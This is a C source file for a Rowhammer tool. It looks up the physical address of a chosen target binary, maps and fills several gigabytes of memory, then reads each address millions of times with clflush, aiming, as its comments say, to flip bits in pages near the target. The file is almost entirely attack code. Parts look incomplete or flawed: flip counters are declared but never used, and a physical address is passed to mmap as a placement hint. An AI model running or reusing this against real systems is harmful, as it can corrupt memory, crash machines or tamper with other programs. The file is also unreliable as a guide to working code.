#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <time.h>
#include <unistd.h>
#include "memutils.cc"


#define NUMBER_OF_READS (5*1000*1000)
#define PRINTF_REWIND() do { if (replaceline) { replaceline = 0; printf("\033[2K\r"); }; } while (0)
#define PRINTF_REWIND_AND_RESET() do { if (replaceline) { replaceline = 0; printf("\033[2K\r"); }; replaceline = 1; } while (0)

void gettimestr(char* buffer) {
	time_t timer;
	struct tm* tm_info;

	time(&timer);
	tm_info = localtime(&timer);

	strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
}

int main(int argc, char* argv[]) {
    // input parsing
    setvbuf(stdout, 0, _IONBF, 0);
    if (argc < 2)
        exit(fprintf(stderr, "ERROR: Usage: %s <gigabytes to allocate, e.g. 1-32> [target binary path]\n", argv[0]));
    char* end = 0;
    size_t memsizegb = strtoull(argv[1],&end,10);
    size_t memsize = 1024ULL * 1024ULL * 1024ULL * memsizegb;
    if (end == argv[1] || memsizegb == 0)
        exit(fprintf(stderr, "ERROR: Usage: %s <gigabytes to allocate, e.g. 1-32> [target binary path]\n", argv[0]));

    size_t target_addr = 0;
    if (argc >= 3) {
    	target_addr = get_physical_addr_of_binary(argv[2]);
    	printf("Target %p\n", (void*)target_addr);
    }
    // reserve address space for array
    // uint32_t* array = (uint32_t*) malloc(memsize);
    uint32_t* array = (uint32_t*) mmap((void*)target_addr, memsize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    // alternatively you can try: uint32_t* array = (uint32_t*) mmap(0, memsize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (array == 0 || array == (uint32_t*)-1ULL)
        exit(fprintf(stderr, "ERROR: could not allocate enough memory\n"));
   	printf("Allocated at %p\n", (void*)array);
    // allocate memory for array by filling it with random but recognizable data
    size_t percent = 0;
    for (size_t i = 0; i < memsize/sizeof(uint32_t); ++i)
    {
        if ((100 * i) / (memsize/sizeof(uint32_t)) != percent)
            printf("\033[2K\rAllocating memory... %zu%%",percent = (100 * i) / (memsize/sizeof(uint32_t)));
        array[i] = 0xFFFFFFFFU * (rand() % 2);
    }
    printf("\033[2K\r");

    size_t flips = 0, tries = 0, replaceline = 0, offset = 0, phys;

    char timestr[26];
    // Hammer all allocated space
    // We'll probably hammer some page that is very close to the target binary
    for (size_t offset = 0; offset < memsize/sizeof(uint32_t); offset++) {
    	volatile uint32_t* aggressor = array + offset;
        PRINTF_REWIND_AND_RESET();
        printf("Hammering attempt %16zu at offset %zu", ++tries, offset);
        size_t number_of_reads = NUMBER_OF_READS;
        while (number_of_reads-- > 0)
        {
            *aggressor;
            asm volatile("clflush (%0)" : : "r" (aggressor) : "memory");
        }
    }

    return 0;
}

